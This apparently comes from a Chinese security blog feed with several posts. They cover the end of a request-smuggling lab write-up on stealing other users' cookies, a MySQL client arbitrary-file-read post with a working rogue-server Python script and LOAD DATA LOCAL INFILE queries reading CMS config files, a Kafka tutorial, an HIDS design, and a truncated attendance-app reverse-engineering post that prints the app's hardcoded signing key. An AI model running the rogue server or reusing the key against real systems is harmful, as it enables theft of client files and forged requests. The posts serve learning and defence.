alt="image20200312112425807.png"></p><p>再尝试走私请求来访问搜索，尝试了多次，添加头后终于看到了需要的请求头。而content-length的大小关系泄露出来的多少有关。</p><p><img src="/images/2020/03/12/65edc1c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312113305960.png"></p><p>查看到了熟悉的用户页面</p><p><img src="/images/2020/03/12/6be3a2c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312113552192.png"></p><p>不过删除过程中发现，如果还按照之前的方式来删除用户，会不能删除，多次尝试后发现提示不允许换行符。</p><p><img src="/images/2020/03/12/7016c520-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312114635935.png"></p><p>重新尝试发现使用GET方法来删除即可</p><p><img src="/images/2020/03/12/75631fb0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312114612255.png"></p><h4 id="获取其他用户cookie"><a href="#获取其他用户cookie" class="headerlink" title="获取其他用户cookie"></a>获取其他用户cookie</h4><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p><p>这个实验一开始并没有get到点，查看解后才发现原来忽略了长度。</p><p>我们提交请求的时候，受害者也会提交请求，就是需要获取并显示受害者的请求来达到获取cookie的目的。</p><p><img src="/images/2020/03/12/7b736680-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115112213.png"></p><p>提交请求后显示跳转地址</p><p><img src="/images/2020/03/12/7f3fb0c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115922944.png"></p><p>查看页面的显示，从而获取用户的请求cookie</p><p><img src="/images/2020/03/12/83413bd0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115952305.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;原理有两篇文章写的十分详细，此处不在过多陈述。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-se
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>MySQL客户端任意文件读取</title>
    <link href="/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>/2020/01/MySQL客户端任意文件读取/</id>
    <published>2020-01-20T06:15:08.000Z</published>
    <updated>2020-01-20T06:15:08.138Z</updated>
    
    <content type="html"><![CDATA[<p>最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。</p><p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain" target="_blank" rel="noopener">https://lorexxar.cn/2020/01/14/css-mysql-chain</a></p><h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a><strong>LOAD DATA INFILE</strong></h3><p>LOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。</p><p>如果执行<code>load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code>提示</p><p><img src="/images/2020/01/20/e5325b10-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119151353641.png"></p><p>受到<code>secure_file_priv</code>的导入导出限制。</p><p>但是使用<code>load data local infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code></p><p>就会把客户端的文件读取到服务端，并且不再受到<code>secure_file_priv</code>的导入导出限制。</p><p><img src="/images/2020/01/20/f1b88850-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162253456.png"></p><p>也就是说只要我们伪造一个服务端，让客户端主动连接过来，这样我们就可以任意读取系统上的文件等。</p><h3 id="请求协议分析"><a href="#请求协议分析" class="headerlink" title="请求协议分析"></a>请求协议分析</h3><h4 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h4><p>先发送一个Greeting请求包，获取一些server信息。</p><p><img src="/images/2020/01/20/f8566920-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162658492.png"></p><p>接着会发送一个认证请求包，包含账号密码</p><p><img src="/images/2020/01/20/fc5c6100-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162740414.png"></p><p>后面会再接着发送一些查询请求，获取一些设置和编码信息等。</p><p><img src="/images/2020/01/20/031061e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162840532.png"></p><h4 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h4><p>这时候我们点加载本地文件到test数据库中，会有三条相关的请求。第一条是发送查询语句</p><p><img src="/images/2020/01/20/0767ae10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162935498.png"></p><p>第二条是服务端返回了加载的文件地址给客户端</p><p><img src="/images/2020/01/20/0b95ee70-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163231329.png"></p><p>第三条就是客户端根据返回的地址读取文件，发送给服务端</p><p><img src="/images/2020/01/20/1063ca30-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163522298.png"></p><p>所以这相当于一个客户端根据服务端的返回来读取文件请求给服务端的过程，也就是服务端是一直可信的。</p><p>而此处的利用就是，当服务端不可信的时候，利用返回来读取连接的客户端的信息文件。</p><p>那么，是不是只有在加载LOAD DATA LOCAL的时候才可以进行读取客户端文件，而别的时候不行呢。官方有一句这么解释，此处翻译为中文</p><p><img src="/images/2020/01/20/140e3490-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163953396.png"></p><p><strong>意思是可以在任何语句中返回具有读取权限的文件</strong>。</p><h3 id="受影响应用"><a href="#受影响应用" class="headerlink" title="受影响应用"></a>受影响应用</h3><p>server端使用如下脚本：</p><pre><code>#coding=utf-8 import socketimport logginglogging.basicConfig(level=logging.DEBUG)filename=&quot;C:\\Windows\\win.ini&quot;sv=socket.socket()sv.bind((&quot;&quot;,3306))sv.listen(5)conn,address=sv.accept()logging.info(&#39;Conn from: %r&#39;, address)conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)conn.recv(9999)logging.info(&quot;auth okay&quot;)conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)conn.recv(9999)logging.info(&quot;want file...&quot;)wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filenameconn.sendall(wantfile)content=conn.recv(9999)logging.info(content)conn.close()</code></pre><p>利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应</p><p><img src="/images/2020/01/20/195f4a10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171211299.png"></p><p>python2的MySQLdb</p><p><img src="/images/2020/01/20/1d4bed90-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171833747.png"></p><p>不过在测试中发现python3的pymysql确不受影响</p><p><img src="/images/2020/01/20/214ba3e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119172212466.png"></p><h3 id="拓展利用"><a href="#拓展利用" class="headerlink" title="拓展利用"></a>拓展利用</h3><p>在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。</p><pre><code>load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\n&#39;;</code></pre><p><img src="/images/2020/01/20/26688a00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120135559523.png"></p><pre><code>select * from dede_log;</code></pre><p>使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。</p><p><img src="/images/2020/01/20/2bc49c00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140154255.png"></p><p>先更改数据库</p><pre><code>use test;load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\n&#39;;select * from test.test;</code></pre><p><img src="/images/2020/01/20/315aa9c0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140411574.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://l
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Kafka</title>
    <link href="/2020/01/Kafka/"/>
    <id>/2020/01/Kafka/</id>
    <published>2020-01-14T08:05:55.000Z</published>
    <updated>2020-01-16T08:16:55.346Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Kafka-简介"><a href="#Kafka-简介" class="headerlink" title="Kafka 简介"></a>Kafka 简介</h3><p>详情：<a href="http://kafka.apachecn.org/intro.html" target="_blank" rel="noopener">http://kafka.apachecn.org/intro.html</a></p><h3 id="Kafka-使用"><a href="#Kafka-使用" class="headerlink" title="Kafka 使用"></a>Kafka 使用</h3><p>简介这种网上很多的，此处不介绍了，可以查看以上ApacheCN的文档，就直接开始使用和python之间的整合。</p><p>下载当前的最新版本：</p><pre><code>wget http://archive.apache.org/dist/kafka/2.4.0/kafka_2.13-2.4.0.tgz</code></pre><p>此处没有搭建zookeeper，就直接使用kafka的便捷脚本创建节点</p><pre><code>./bin/zookeeper-server-start.sh config/zookeeper.properties</code></pre><p>如果出现错误<code>Unrecognized VM option &#39;PrintGCDateStamps&#39;</code>，可能是Java版本和Kafka版本之间的问题，尝试使用更高版本的Kafka或者其他版本的Java。</p><p>启动kafka，先复制一份需要的配置文件</p><pre><code>cp config/server.properties config/server-1.properties</code></pre><p>配置文件中</p><pre><code>broker.id=0  #必须唯一，当前只设置一个，所以暂不更改listeners=PLAINTEXT://:9092 #listeners是broker监听的地址和端口，多broker的时候需要不重复log.dirs=/tmp/kafka-logs-1 #日志，此处改为kafka-logs-1zookeeper.connect=localhost:2181  #zookeeper地址，没更改</code></pre><p>启动kafka</p><pre><code>./bin/kafka-server-start.sh config/server-1.properties</code></pre><p>一串输出后，kafka启动成功</p><p><img src="https://i.loli.net/2020/01/14/jTvtupFxArQEIoh.png" alt="1578901458153.png"></p><h4 id="创建一个主题"><a href="#创建一个主题" class="headerlink" title="创建一个主题"></a>创建一个主题</h4><pre><code>./bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test   #创建test主题,replication-factor副本数，小于集群服务器数./bin/kafka-topics.sh --list --zookeeper localhost:2181  #查看当前主题</code></pre><p><img src="https://i.loli.net/2020/01/14/VMQzbmGAuKjyHrx.png" alt="1578902209494.png"></p><h4 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h4><p>当在生产者发送消息的时候，消费者会显示消息</p><pre><code>./bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --from-beginning # 消费者监听，此时有生产者传入消息会显示./bin/kafka-console-producer.sh --broker-list localhost:9092 --topic test #生产者发送消息</code></pre><h4 id="多代理集群"><a href="#多代理集群" class="headerlink" title="多代理集群"></a>多代理集群</h4><p>为每个代理创建一个配置文件</p><pre><code>如上的复制配置文件cp config/server.properties config/server-1.properties修改配置文件参数config/server-1.properties:    broker.id=1    listeners=PLAINTEXT://:9093    log.dir=/tmp/kafka-logs-1</code></pre><p>启动新节点</p><pre><code>./bin/kafka-server-start.sh config/server-1.properties &amp;</code></pre><p>重新创建一个主题，然后通过生产者和消费者来处理消息，处理方式和上一样，只是需要更改不同的topic</p><h4 id="导入-导出文件"><a href="#导入-导出文件" class="headerlink" title="导入/导出文件"></a>导入/导出文件</h4><p>使用官方提高的三个配置文件，首先是Kafka Connect的配置文件，包含常用的配置，如Kafka brokers连接方式和数据的序列化格式。 其余的配置文件均指定一个要创建的连接器。这些文件包括连接器的唯一名称，类的实例，以及其他连接器所需的配置。</p><pre><code>./bin/connect-standalone.sh config/connect-standalone.properties config/connect-file-source.properties config/connect-file-sink.properties</code></pre><p>一连串输出后，提示没有test.txt文件。</p><p><img src="https://i.loli.net/2020/01/14/GvlowAIxhsKFmi3.png" alt="1578905379715.png"></p><p>创建test.txt，就可以看到对文件的处理，文件夹下就会生成test.sink.txt。</p><p><img src="https://i.loli.net/2020/01/14/rp4KibEAcl5Htog.png" alt="1578905418254.png"></p><h3 id="使用python处理消息"><a href="#使用python处理消息" class="headerlink" title="使用python处理消息"></a>使用python处理消息</h3><p>安装包</p><pre><code>pip3 install kafka-python</code></pre><p>使用文档</p><pre><code>https://kafka-python.readthedocs.io/en/master/usage.html</code></pre><h4 id="生产者代码："><a href="#生产者代码：" class="headerlink" title="生产者代码："></a>生产者代码：</h4><pre><code>from kafka import KafkaProducerfrom kafka.errors import KafkaErrorproducer = KafkaProducer(    bootstrap_servers=[        &quot;localhost:9092&quot;  ])future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;)try:    record_metadata = future.get(timeout=10)    print(record_metadata)except KafkaError as e:    print(e)</code></pre><p>发送成功后返回</p><pre><code>RecordMetadata(topic=&#39;test&#39;, partition=0, topic_partition=TopicPartition(topic=&#39;test&#39;, partition=0), offset=3, timestamp=1578905897675, checksum=None, serialized_key_size=-1, serialized_value_size=13, serialized_header_size=-1)</code></pre><p>也可以格式化消息格式</p><pre><code>from kafka import KafkaProducerfrom kafka.errors import KafkaErrorproducer = KafkaProducer(  bootstrap_servers=[        &quot;localhost:9092&quot;  ]  #value_serializer=lambda m: json.dumps(m).encode(&#39;ascii&#39;) #生产者发送json数据)future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;)#future = producer.send(&#39;test&#39;, {&#39;key&#39;: &#39;value&#39;})try:    record_metadata = future.get(timeout=10)    print(record_metadata)except KafkaError as e:    print(e)</code></pre><h4 id="消费者代码"><a href="#消费者代码" class="headerlink" title="消费者代码"></a>消费者代码</h4><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id = &quot;user-test&quot;,   #群组id，消息只能被同组的一个消费者消费，所以需要定义组名    bootstrap_servers = [        &quot;localhost:9092&quot;    ]    #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式)for message in consumer:    print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition,                                          message.offset, message.key,                                          message.value))</code></pre><p>消费这运行后处于监听状态，当运行如上的生产者代码的时候，界面会显示出生产者的消息</p><p><img src="https://i.loli.net/2020/01/14/TXHazuyFBOMercZ.png" alt="1578907705145.png"></p><h3 id="项目中引用"><a href="#项目中引用" class="headerlink" title="项目中引用"></a>项目中引用</h3><p>kafka在实现过程中，消费者处于监听状态，但是项目运行时，阻塞性的监听并不可用，可以使用多线程或者其他方式来处理。</p><pre><code>def search_area():    prints = PrintThread()    prints.setDaemon(True)    prints.start()    for i in range(100,200):         time.sleep(1)         print(i)import threadingimport timefrom kafka import KafkaConsumerclass PrintThread(threading.Thread):    def run(self):        print(&quot;start.... %s&quot; %self.getName())        consumer = KafkaConsumer(            &quot;test&quot;,            group_id = &quot;user-test&quot;,   #群组id，消息只能被同组的一个消费者消费，所以需要定义组名            bootstrap_servers = [                &quot;localhost:9092&quot;            ]            #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式        )        for message in consumer:            print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition,                                                  message.offset, message.key,                                                  message.value))search_area()</code></pre><p>达到主线程不阻塞的情况下仍然可以继续监听</p><p><img src="https://i.loli.net/2020/01/14/lYfcqCXow9R2gJW.png" alt="1578987250537.png"></p><p>或者不采用监听的方式，采用主动拉取队列数据，这样一次拉取的时候可能是较大的数据，对数据量处理要求高的情况下可能会增加消息延迟堆积</p><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id=&#39;user-test&#39;,     bootstrap_servers = [        &quot;localhost:9092&quot;    ])consumer.subscribe(topics=(&#39;test&#39;,))#  consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;))  #订阅多个主题msg = consumer.poll(timeout_ms=2000)  # 从kafka获取消息print(msg)for tp, messages in msg.items():    for message in messages:        print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition,                                          message.offset, message.key,                                          message.value))</code></pre><p>但是这样做会出现多次获取重复已消费的信息，因为自动位移提交的动作是在 poll() 方法的逻辑里完成的，在每次真正向服务端发起拉取请求之前会检查是否可以进行位移提交，如果可以，那么就会提交上一次轮询的位移。单次请求的时候不能提交offset。</p><p><img src="https://i.loli.net/2020/01/14/Fex4WgyqDaQ37vM.png" alt="1578984621248.png"></p><p>添加如下手动提交已消费信息</p><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id=&#39;user-test&#39;,     enable_auto_commit = False,    bootstrap_servers = [        &quot;localhost:9092&quot;    ])consumer.subscribe(topics=(&#39;test&#39;,))#  consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;))  #订阅多个主题msg = consumer.poll(timeout_ms=2000)  # 从kafka获取消息print(msg)for tp, messages in msg.items():    for message in messages:        print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition,                                          message.offset, message.key,                                          message.value))consumer.commit()  #同步提交，直到正常或异常返回之前阻塞consumer.commit_async() #异步提交，不阻塞</code></pre><p>读取已消费信息</p><p>使用 seek方法从指定的partition和offset开始读取数据，需要记录分区和offset。</p><pre><code>#encoding:utf8from kafka import KafkaConsumer, TopicPartitionmy_topic = &quot;my.topic&quot; # 指定需要消费的主题consumer = KafkaConsumer(    bootstrap_servers = &quot;192.168.70.221:19092,192.168.70.222:19092,192.168.70.223:19092&quot;, # kafka集群地址    group_id = &quot;my.group&quot;, # 消费组id    enable_auto_commit = True, # 每过一段时间自动提交所有已消费的消息（在迭代时提交）    auto_commit_interval_ms = 5000, # 自动提交的周期（毫秒）)consumer.assign([    TopicPartition(topic=my_topic, partition=0),    TopicPartition(topic=my_topic, partition=1),    TopicPartition(topic=my_topic, partition=2)])consumer.seek(TopicPartition(topic=my_topic, partition=0), 12) # 指定起始offset为12consumer.seek(TopicPartition(topic=my_topic, partition=1), 0) # 可以注册多个分区，此分区从第一条消息开始接收# consumer.seek(TopicPartition(topic=my_topic, partition=2), 32) # 没有注册的分区上的消息不会被消费for msg in consumer: # 迭代器，等待下一条消息    print msg # 打印消息</code></pre><h3 id="部署kafka"><a href="#部署kafka" class="headerlink" title="部署kafka"></a>部署kafka</h3><p>配置好需要的参数后</p><pre><code>./bin/zookeeper-server-start.sh -daemon config/zookeeper.properties</code></pre><p>就可以看到zookeeper处于监听状态，当然zookeeper这个一般使用集群部署的节点，此处仍然是使用kafka。</p><p><img src="https://i.loli.net/2020/01/16/sQotxmScwZUjlfO.png" alt="1579162043232.png"></p><pre><code>./bin/kafka-server-start.sh -daemon config/server-1.properties</code></pre><p><img src="https://i.loli.net/2020/01/16/jQ8E2tVhCTfx4Dr.png" alt="1579162335867.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Kafka-简介&quot;&gt;&lt;a href=&quot;#Kafka-简介&quot; class=&quot;headerlink&quot; title=&quot;Kafka 简介&quot;&gt;&lt;/a&gt;Kafka 简介&lt;/h3&gt;&lt;p&gt;详情：&lt;a href=&quot;http://kafka.apachecn.org/intro.ht
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>中小型企业自研HIDS简单实现</title>
    <link href="/2020/01/%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E8%87%AA%E7%A0%94HIDS%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
    <id>/2020/01/中小型企业自研HIDS简单实现/</id>
    <published>2020-01-10T03:51:09.000Z</published>
    <updated>2020-01-10T04:40:12.100Z</updated>
    
    <content type="html"><![CDATA[<p>此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：</p><ol><li><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">驭龙</a></li><li><a href="https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html" target="_blank" rel="noopener">美团</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MjE4MDc4OQ==&amp;mid=2247483961&amp;idx=1&amp;sn=2736aad509f08c20d82cfc08b62da27a&amp;chksm=ec040463db738d754cce84506c098caca891b58740e1b38b3621f752f805eb1c02ebf0e2ac73&amp;mpshare=1&amp;scene=1&amp;srcid=1226ZgmHAUTfeYMuLFPWyuHS#rd" target="_blank" rel="noopener">点融</a></li><li><a href="https://misakikata.github.io/2019/12/OSSEC-Wazuh/" target="_blank" rel="noopener">Wazuh</a></li></ol><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>架构采用，一般中小型企业安全人员较少，重视度远不如大型企业，多见“一个人的安全部”。架构不适宜过于复杂，后端开发可以根据实际采用python，go，Java等。web框架，有django，php都可以使用。消息的被动或者主动获取又涉及到是否需要使用ES或者ActiveMQ。这一点后面再讨论。此处使用平安集团分享的一个预警结构流程。</p><p><img src="https://i.loli.net/2020/01/10/WpozHBZAmJLiO4U.png" alt="1578622803994.png"></p><h3 id="Agent"><a href="#Agent" class="headerlink" title="Agent"></a>Agent</h3><p>agent的建设是整个流程中最费劲的事情了。需要以下几种特点</p><ol><li>可维护性高，获取信息稳定</li><li>对系统侵入小，适合多种系统的多版本内核</li><li>通道信息安全，进程可维护</li><li>支持灵活检测，负载小</li><li>便于一键化部署</li></ol><p>对于互联网大厂采用的方案多是hook，audit等。hook的侵入性比较高，在没有专门的定制化开发下，中小型企业使用的成本比较高，之前在试图部署驭龙的时候就发现太容易对系统造成崩溃。这是生产系统不能接受的。</p><p>如何选择侵入小，兼容高，信息全，成本低就是主要考虑了。</p><p>对文件监控上比较好的开源监控也就是aide和inotify-tools。aide是对文件的hash比较来判断文件的改动，无实时性。inotify是实时监控，倾向于此。在实际系统测试上，对各个Linux的发行版兼容性也可以满足需求。</p><p>其他信息的获取上，倾向于python库psutil。这是Linux的运维的第三方模块。可以收集很多Linux系统的信息，进程，网络，用户，内存等。可以跟主机做实时的信息获取。而且实现简单，方便跟inotify做联动。</p><p>信息推送上，如果考虑实时性，可以使用agent主动推送的信息实现方案，但这样做会面临多服务的压力，延迟，丢失。所以需要对信息做消息处理，就需要消息队列。采用何种方式根据需求选择。</p><p>agent被动提供消息，只需要把获取的信息提交到某个特定的地址。比如，此处使用类似ES的信息提供方式，agent获取信息后交给flask以json来展示，server对agent来做守护任务来被动获取。这样，实时性较低，需要对获取的信息做过滤处理。但消息获取上比较稳定。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>server端主要做信息的展示和处理整合，此处直接使用python-django。如果使用被动获取信息，需要server做定时任务，采用任务框架APScheduler来管理定时任务。</p><p>简而言之，实现方便，操作简单。server端还真是没有多少值得谈论。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>虽然名为HIDS，但还是需要一些其他功能，只是agent传输的文件监控和主机的信息仿佛作用较低。而且在监控中可以看到，当服务文件改动较多的时候，提示的预警信息过于频繁。分析较为困难。所以为了便于发现其中存在的问题，使用文件扫描功能，比如Linux下的河马webshell扫描。调用扫描来对预警文件进行判断，但扫描识别率测试中，只有百分之六十到七十左右。识别率是否能接受就看个人情况拉。</p><p>同时，对于感染型后门，我增加了一个对威胁信息的检测。从以下地址获取感染IP：</p><p><a href="http://osint.bambenekconsulting.com" target="_blank" rel="noopener">http://osint.bambenekconsulting.com</a></p><p><a href="https://feodotracker.abuse.ch" target="_blank" rel="noopener">https://feodotracker.abuse.ch</a></p><p>通过网络连接来判断是否有类似的感染发生，对于IP的获取同样使用定时任务。</p><h3 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h3><p>目前想通过web日志的方式来做检测告警，比如，大量文件的变更时，跟web日志做查询，来判断是否是一个外部创建的文件。通过ES日志服务器来整合，但在实现中发现，不一定创建成功的文件就一定在日志中，就像文件重命名。所以此功能具体的实现还有待考究。</p><p>如果后期可以发现一种webshell识别较高的情况，可以使用扫描价web日志联合告警的方式来减少预警的情况下，提高准确度。</p><p>由于使用上没有采用agent主动推送，没用参考消息队列，后期准备改为推送和消息队列形式，同时增加对文件检测的识别和减少告警。同时希望agent的信息获取可以使用audit的方式。</p><p>以下是代码实现，简单到会django就可以做二次修改哦</p><p><a href="https://github.com/MisakiKata/zeru" target="_blank" rel="noopener">zeru</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/ysrc/yulong-hids&quot; target=&quot;_blank&quot; rel=&quot;noo
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>逆向打卡APP</title>
    <link href="/2019/12/%E9%80%86%E5%90%91%E6%89%93%E5%8D%A1APP/"/>
    <id>/2019/12/逆向打卡APP/</id>
    <published>2019-12-28T14:57:04.000Z</published>
    <updated>2019-12-28T14:57:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>公司打卡APP，由于偶尔忘记打卡，所以想做一个能查询是否打卡来提醒自己的脚本，为什么不做自动打卡脚本，担心万一更新出问题，但没有发现，那岂不是很尴尬。</p><p>首先抓包，查看查询打卡的请求。</p><p><img src="https://i.loli.net/2019/12/28/nTaUrsMmBKqwZ2d.png" alt="image20191228215916256.png"><br>获取其中的参数，其中userid为手机号，rmk3为设备uid，reqssn为固定字符串，所以需要知道加密算法来计算sign</p><pre><code>fm=&lt;fm&gt;&lt;userid&gt;178xxxx&lt;/userid&gt;&lt;ver&gt;3.2.0&lt;/ver&gt;&lt;rmk1/&gt;&lt;rmk2&gt;2&lt;/rmk2&gt;&lt;rmk3&gt;8xxxx-xxxx-xxxx-xxxx-BCxxxxxxxx71&lt;/rmk3&gt;&lt;action&gt;attendRecord&lt;/action&gt;&lt;reqssn&gt;2244f70148454d03baeb739d9c86e082&lt;/reqssn&gt;&lt;sign&gt;54bexxxxxx&lt;/sign&gt;&lt;/fm&gt;</code></pre><p>按照惯例，解包后搜索参数名，找到一个sign函数，查看后发现是加密函数，其中部分代码如下，或者uuid，拼接参数</p><p><img src="https://i.loli.net/2019/12/28/goh6MUtlId1QeJj.png" alt="2.png"><br>其中有个私钥，记录一下</p><pre><code>PRIVATE_KEY = &quot;6fcb5584c28743b8ff16337353b0cabe&quot;</code></pre><p>继续查看，就可以看到后面还拼接了reqssn，然后通过和私钥的拼接组成新的字符串做一个sha256加密。所以，这个reqssn参数是哪里来的呢，是否是固定值。搜索查看</p><p><img src="https://i.loli.net/2019/12/28/ThS3Rj1Yf2oBqmO.png" alt="3.png"></p><p>在其他函数位置发现，reqssn的值，是固定值，且写入代码中。后面的就是上面所说的sign函数。<br><img src="https://i.loli.net/2019/12/28/eH4gfNX21yTZdnB.png" alt="4.png"></p><p>至于uuid是怎么发现，继续查看相关的代码引用，发现是利用本地读取的文件，打开测试机，找到如下位置，发现保存的uuid</p><p><img src="https://i.loli.net/2019/12/28/EK1VpcO6BMsJNCm.png" alt="5.png"></p><p>理论上至此，参数值和加密已经得知，但是经过计算还是不一样，继续查看调用的加密，发现其中做了一次base64的编码，然后再sha256加密。</p><p><img src="https://i.loli.net/2019/12/28/4aLcN3QHoKe9GV2.png" alt="6.png"></p><p>至此能算出加密值和抓包到的结果一致。</p><p><img src="https://i.loli.net/2019/12/28/o4YKayEedkcAQ5J.png" 